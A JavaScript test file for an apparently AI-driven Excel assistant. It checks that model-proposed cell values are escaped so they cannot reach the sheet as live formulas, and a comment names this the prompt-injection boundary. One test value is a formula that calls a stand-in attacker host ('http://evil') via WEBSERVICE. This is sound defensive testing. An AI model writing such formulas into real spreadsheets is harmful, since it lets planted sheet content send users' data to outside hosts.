import test from "node:test";
import assert from "node:assert/strict";
import {
  MAX_ACTIONS,
  literalCellValue,
  literalizeGrid,
  splitReply,
  describe,
  tableName,
} from "./actions.js";

// ---- literalCellValue: the prompt-injection boundary ----------------------
// Sheet content is untrusted input that round-trips through the model, so a
// proposed value must never reach Excel as a live formula.

test("literalCellValue neutralises every formula-triggering prefix", () => {
  for (const v of ["=WEBSERVICE(\"http://evil\")", "+1+1", "-1", "@SUM(A1)"]) {
    assert.equal(literalCellValue(v), "'" + v, `unescaped: ${v}`);
  }
});

test("literalCellValue leaves ordinary values alone", () => {
  assert.equal(literalCellValue("hello"), "hello");
  assert.equal(literalCellValue("a=b"), "a=b", "only a LEADING trigger counts");
  assert.equal(literalCellValue(""), "");
  assert.equal(literalCellValue(42), 42);
  assert.equal(literalCellValue(true), true);
  assert.equal(literalCellValue(null), null);
});

test("literalizeGrid neutralises every cell, and tolerates an empty grid", () => {
  assert.deepEqual(literalizeGrid([["=A1", "ok"], [1, "@x"]]), [["'=A1", "ok"], [1, "'@x"]]);
  assert.deepEqual(literalizeGrid(undefined), []);
  assert.deepEqual(literalizeGrid([]), []);
});

// ---- splitReply -----------------------------------------------------------

test("splitReply reads a fenced actions block and strips it from the prose", () => {
  const raw = 'Đây là đề xuất.\n```json\n{"actions":[{"type":"setCell","cell":"A1","new":"x"}]}\n```';
  const { prose, actions } = splitReply(raw);
  assert.equal(actions.length, 1);
  assert.equal(actions[0].cell, "A1");
  assert.equal(prose, "Đây là đề xuất.");
});

test("splitReply survives braces in the prose before an unfenced block", () => {
  const raw = 'Dùng {tên} làm nhãn. {"actions":[{"type":"newSheet","name":"S"}]}';
  const { actions } = splitReply(raw);
  assert.deepEqual(actions, [{ type: "newSheet", name: "S" }]);
});

test("splitReply maps the legacy editPlan shape onto setCell actions", () => {
  const { actions } = splitReply('```json\n{"editPlan":[{"cell":"B2","new":"7"}]}\n```');
  assert.deepEqual(actions, [{ type: "setCell", cell: "B2", new: "7" }]);
});

test("splitReply returns no actions for malformed JSON rather than throwing", () => {
  const { actions } = splitReply('Xong.\n```json\n{"actions":[{"type":\n```');
  assert.deepEqual(actions, []);
});

test("splitReply rejects a non-array actions value", () => {
  assert.deepEqual(splitReply('```json\n{"actions":"drop table"}\n```').actions, []);
});

test("splitReply keeps a plain chat reply intact", () => {
  const { prose, actions } = splitReply("Bảng này có 3 cột.");
  assert.equal(prose, "Bảng này có 3 cột.");
  assert.deepEqual(actions, []);
});

test("splitReply substitutes placeholder prose when the reply is only a block", () => {
  const { prose } = splitReply('```json\n{"actions":[{"type":"newSheet","name":"S"}]}\n```');
  assert.match(prose, /thay đổi đề xuất/);
});

// ---- describe: what the user reads before pressing Apply ------------------

test("describe renders each known action type", () => {
  assert.match(describe({ type: "setCell", cell: "A1", old: "1", new: "2" }), /A1.*"1".*"2"/);
  assert.match(describe({ type: "setCells", range: "A1:B2", values: [[1, 2]] }), /A1:B2 \(1 rows\)/);
  assert.match(describe({ type: "format", range: "C1", numberFormat: "0.00", bold: true }), /0\.00.*bold/);
  assert.match(describe({ type: "createTable", range: "A1:B2" }), /"Table" over A1:B2/);
  assert.match(describe({ type: "createChart", dataRange: "A1:B9" }), /Column chart from A1:B9/);
  assert.match(describe({ type: "newSheet", name: "Dash" }), /New sheet "Dash"/);
  assert.match(describe({ type: "renameSheet", to: "2021" }), /→ "2021"/);
});

test("describe shows an unknown action raw instead of hiding it", () => {
  assert.equal(describe({ type: "deleteEverything" }), '{"type":"deleteEverything"}');
});

test("describe does not hide a formula-looking proposed value", () => {
  assert.match(describe({ type: "setCell", cell: "A1", new: "=WEBSERVICE(x)" }), /=WEBSERVICE\(x\)/);
});

// ---- misc -----------------------------------------------------------------

test("tableName strips illegal characters and leading digits", () => {
  assert.equal(tableName("Leads 2021"), "Leads_2021");
  assert.equal(tableName("2021 leads"), "_021_leads");
  assert.equal(tableName("a-b.c"), "a_b_c");
});

test("MAX_ACTIONS is a reviewable number", () => {
  assert.equal(typeof MAX_ACTIONS, "number");
  assert.ok(MAX_ACTIONS > 0 && MAX_ACTIONS <= 200);
});
